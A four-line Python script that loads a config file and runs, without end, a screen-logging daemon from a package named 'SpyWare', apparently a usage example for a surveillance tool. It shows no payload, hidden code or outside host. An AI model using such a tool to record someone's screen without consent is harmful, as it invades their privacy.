from SpyWare.ScreenLogger import Daemon, screenConfig

screenConfig("my.conf")

Daemon().run_for_ever()
